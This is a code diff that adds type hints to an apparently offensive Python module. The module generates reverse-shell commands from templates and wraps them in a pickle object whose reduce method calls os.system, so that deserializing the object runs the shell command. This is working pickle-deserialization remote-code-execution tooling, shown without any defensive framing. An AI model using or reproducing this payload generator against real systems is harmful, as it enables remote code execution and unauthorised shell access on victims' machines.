@@ -20,7 +20,7 @@ rev_shells = {
 }
 
 
-def rev_shell(host, port, typ):
+def rev_shell(host: str, port: str, typ: str):
 	return rev_shells[typ].format(host, port)
 
 
@@ -32,7 +32,9 @@ class PickleRCE:
 		return os.system, (self.cmd,)
 
 
-def pickle_rev_shell(host, port, typ="python", protocol=None):
+def pickle_rev_shell(
+	host: str, port: str, typ: str = "python", protocol: int | None = None
+):
 	return pickle.dumps(PickleRCE(rev_shell(host, port, typ)), protocol)
 
 
